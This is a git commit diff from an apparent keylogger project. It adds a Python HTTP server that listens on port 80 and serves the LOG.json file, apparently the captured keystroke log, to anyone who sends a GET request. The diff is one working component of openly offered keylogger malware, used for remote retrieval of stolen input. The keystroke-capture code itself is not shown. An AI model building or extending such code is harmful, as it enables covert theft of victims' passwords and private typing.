ac43c3399b89e98b098129eb69f150e6fea1bd01
AsadKhan163631 <34480579+AsadKhan163631@users.noreply.github.com>
2019-04-11 00:34:06 +0100

    minor changes

--- key_logger/http_server.py
+++ key_logger/http_server.py
@@ -1,6 +1,37 @@
-class HttpServer:
-
-    def __init__(self):
-        pass
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
 
+class HttpServer(BaseHTTPRequestHandler):
+    """
+    basic http server strapped together
+    """
+    LOG_FILE: str = "LOG.json"  # log file path
+
+    def _set_headers(self):
+        self.send_response(200)
+        self.send_header(b'Content-type', b'text/html')
+        self.end_headers()
+
+    def do_GET(self):
+        self._set_headers()
+        try:
+            self.wfile.write(open(self.LOG_FILE, "r").read().encode())
+        except FileNotFoundError:
+            self.wfile.write(b"{}")
+
+    def do_HEAD(self):
+        self._set_headers()
+
+    def do_POST(self):
+        # Doesn't do anything with posted data
+        self._set_headers()
+        self.wfile.write(b"<html><body><h1>POST!</h1></body></html>")
+
+
+def run(server_class=HTTPServer, handler_class=HttpServer, port=80):
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    httpd.serve_forever()
+
+
+run()
